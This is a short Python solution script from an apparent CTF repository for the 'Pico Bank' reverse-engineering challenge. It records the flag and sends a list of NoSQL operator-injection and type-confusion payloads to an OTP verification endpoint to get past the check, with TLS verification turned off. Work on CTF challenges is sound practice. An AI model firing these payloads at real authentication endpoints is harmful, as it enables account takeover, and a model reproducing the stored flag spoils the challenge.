# 529 - Pico Bank  (Reverse Engineering, picoMini by CMU-Africa)
# Flag: academy{1_l13d_4b0ut_b31ng_s3cur3d_m0b1l3_l0g1n_7f1dd571}
# Write-up: ../../../writeups/reverse-engineering/529-pico-bank.md
# Script exact utilise pour produire le flag.
#
import sys, requests, json
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
requests.packages.urllib3.disable_warnings()
base = open(r"./_z_529base.txt").read().strip()
U = base + "/verify-otp"
tests = [
    ("bool true", {"otp": True}),
    ("bool false", {"otp": False}),
    ("int", {"otp": 1234}),
    ("null", {"otp": None}),
    ("empty", {"otp": ""}),
    ("array", {"otp": ["1234"]}),
    ("obj $ne", {"otp": {"$ne": None}}),
    ("obj $gt", {"otp": {"$gt": ""}}),
    ("obj $regex", {"otp": {"$regex": ".*"}}),
    ("both keys", {"otp": "x", "success": True, "flag": "x", "hint": "x"}),
    ("no otp", {}),
]
for label, body in tests:
    try:
        r = requests.post(U, json=body, timeout=15, verify=False)
        print("%-14s -> %s %r" % (label, r.status_code, r.text[:220]))
    except Exception as e:
        print("%-14s ERR %s" % (label, type(e).__name__))
print()
# variantes form
for label, data in (("form array", {"otp[]": "1"}), ("form otp", {"otp": "1"}),
                    ("form success", {"otp": "x", "success": "true"})):
    try:
        r = requests.post(U, data=data, timeout=15, verify=False)
        print("%-14s -> %s %r" % (label, r.status_code, r.text[:220]))
    except Exception as e:
        print("%-14s ERR %s" % (label, type(e).__name__))
